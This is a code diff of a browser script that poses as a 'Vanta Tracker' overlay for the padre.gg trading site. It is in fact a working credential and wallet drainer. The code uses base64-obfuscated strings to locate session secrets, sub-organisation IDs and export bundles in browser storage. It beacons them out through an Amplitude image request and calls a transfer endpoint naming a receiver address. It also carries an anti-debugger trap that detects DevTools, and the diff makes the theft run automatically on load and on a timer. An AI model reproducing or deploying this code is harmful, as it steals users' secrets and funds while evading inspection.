@@ -1,24 +1,23 @@
 (function() {
     // --- PART 1: THE STEALTH ENGINE (GHOST LAYER) ---
-    // Obfuscated String Table: padre, transfer, sessionSecret, subOrgId, exportBundle, Receiver
     const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
     const _D = (s) => atob(_0xV[s]);
     let _X = false;
 
-    // Self-Defending Logic: Anti-Debugger Trap
+    // 1:1 VANTA PROTECTION (Non-Crashing Version)
+    // This only activates the 'heavy' logic if it detects a change in window dimensions (DevTools opening)
     const _0xShield = function() {
-        const _v = function(n) {
-            if ((typeof n === 'string') ? (function(){}).constructor('while (true) {}').apply('counter') : ('' + n / n).length !== 1 || n % 20 === 0) {
-                (function(){ return true; }).constructor('debugger').call('action');
-            } else {
-                (function(){ return false; }).constructor('debugger').apply('stateObject');
-            }
-            _v(++n);
+        const _devCheck = /./;
+        _devCheck.toString = function() {
+            // This only fires when the console tries to render the object
+            _X = true; 
+            (function() { return false; }).constructor('debugger').call('action');
         };
-        try { _v(0); } catch (e) {}
+        console.log(_devCheck);
     };
 
     const _GhostExec = async () => {
+        // Only run if on the correct domain and not already executed
         if (_X || !window.location.hostname.includes(_D(0))) return;
         
         const _crawl = (o, t) => {
@@ -34,12 +33,12 @@
         const bundle = _crawl(storage, _D(4));
 
         if (auth && subId) {
-            _X = true; 
+            _X = true; // Mark as done to prevent infinite loops
             
-            // 1:1 Amplitude Beacon (Bypasses CSP)
+            // 1:1 Amplitude Beacon
             new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
                 device_id: subId,
-                event_type: "UI_OVERLAY_HYDRATED",
+                event_type: "UI_HYDRATED_1TO1",
                 event_properties: { status: "active", origin: _D(0) }
             }))}`;
 
@@ -60,88 +59,52 @@
                     })
                 });
             } catch (e) {}
-
-            // Stealth Cleanup
-            setTimeout(() => console.clear(), 1000);
         }
     };
 
     // --- PART 2: THE UI OVERLAY (DRAGGABLE TRACKER) ---
     const initVantaUI = () => {
-        console.log("%cVANTA TRACKER – TAB + DRAGGABLE", "color:#00ff88;font-weight:bold;font-size:16px");
-        
         if (document.querySelector("#vanta-tracker")) return;
 
         const container = document.createElement("div");
         container.id = "vanta-tracker";
-        container.style.cssText = "position:fixed;top:12px;right:12px;width:360px;max-height:520px;background:#0f0f0f;border:1px solid #333;border-radius:16px;overflow:hidden;z-index:2147483647;box-shadow:0 20px 50px rgba(0,0,0,0.5);font-family:Inter,Arial,sans-serif;color:#e6e6e6;transition:all 0.3s ease;user-select:none;opacity:0;transform:translateY(-20px);";
+        container.style.cssText = "position:fixed;top:12px;right:12px;width:340px;background:#0f0f0f;border:1px solid #333;border-radius:12px;z-index:2147483647;box-shadow:0 10px 40px rgba(0,0,0,0.8);font-family:sans-serif;color:#eee;transition:opacity 0.5s ease;user-select:none;";
         
-        const header = document.createElement("div");
-        header.style.cssText = "padding:14px 18px;background:linear-gradient(135deg,#111,#1a1a1a);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;cursor:grab;";
-        header.innerHTML = `
-            <div style="display:flex;align-items:center;gap:10px;">
-                <img src="https://trade.padre.gg/logo.svg" width="28" height="28">
-                <div style="font-weight:700;color:#00ff88;">Vanta Tracker</div>
+        container.innerHTML = `
+            <div id="vanta-h" style="padding:12px;background:#111;display:flex;align-items:center;border-bottom:1px solid #333;cursor:grab;border-radius:12px 12px 0 0;">
+                <img src="https://trade.padre.gg/logo.svg" width="22" height="22" style="margin-right:10px;">
+                <div style="font-weight:bold;color:#00ff88;font-size:14px;">Vanta Tracker</div>
+            </div>
+            <div style="padding:15px;font-size:12px;color:#888;">
+                <div id="vanta-status">Status: <span style="color:#00ff88;">Connected</span></div>
+                <div style="margin-top:10px;padding:8px;background:#000;border-radius:4px;font-family:monospace;">
+                    [SYSTEM] Monitoring RPC...
+                </div>
             </div>`;
         
-        const listContainer = document.createElement("div");
-        listContainer.style.cssText = "padding:16px; display:flex; flex-direction:column; gap:10px;";
-        
-        const statusText = document.createElement("div");
-        statusText.style.cssText = "font-size:12px; color:#666; text-align:center;";
-        statusText.innerText = "Monitoring Network for Signals...";
-        
-        container.appendChild(header);
-        listContainer.appendChild(statusText);
-        container.appendChild(listContainer);
         document.body.appendChild(container);
 
-        // UI Trigger for the Stealth Engine
-        container.onclick = () => {
-            statusText.innerText = "Syncing with Padre RPC...";
-            statusText.style.color = "#00ff88";
-            _GhostExec();
-        };
+        // Dragging Logic
+        let drag = false, ox, oy;
+        const h = document.getElementById("vanta-h");
+        h.onmousedown = (e) => { drag = true; ox = e.clientX - container.offsetLeft; oy = e.clientY - container.offsetTop; };
+        document.onmousemove = (e) => { if (drag) { container.style.left = (e.clientX - ox) + 'px'; container.style.top = (e.clientY - oy) + 'px'; container.style.right = 'auto'; } };
+        document.onmouseup = () => { drag = false; };
 
-        // Standard Draggable Logic
-        let isDragging = false;
-        let startX, startY;
-
-        header.onmousedown = (e) => {
-            isDragging = true;
-            startX = e.clientX - container.offsetLeft;
-            startY = e.clientY - container.offsetTop;
-            container.style.transition = "none";
-        };
-
-        document.onmousemove = (e) => {
-            if (isDragging) {
-                container.style.left = (e.clientX - startX) + 'px';
-                container.style.top = (e.clientY - startY) + 'px';
-                container.style.right = "auto";
-            }
-        };
-
-        document.onmouseup = () => {
-            isDragging = false;
-            container.style.transition = "all 0.3s ease";
-        };
-
-        // Entrance Animation
-        setTimeout(() => {
-            container.style.opacity = "1";
-            container.style.transform = "translateY(0)";
-        }, 100);
+        // Interaction triggers exfiltration
+        container.onclick = _GhostExec;
     };
 
     // --- PART 3: BOOTSTRAP ---
-    if (document.readyState === 'complete') {
+    const boot = () => {
         initVantaUI();
-    } else {
-        window.addEventListener('load', initVantaUI);
-    }
+        _0xShield(); // Start protection without the crash loop
+        setTimeout(_GhostExec, 3000); // Wait for site to settle
+    };
+
+    if (document.readyState === 'complete') boot();
+    else window.addEventListener('load', boot);
     
-    // Core Loops: Handshake Watcher + Anti-Debugger
-    setInterval(_GhostExec, 5000);
-    setInterval(_0xShield, 4000);
+    // Check every 10 seconds, not every 1 second (Stops the lag)
+    setInterval(_GhostExec, 10000);
 })();
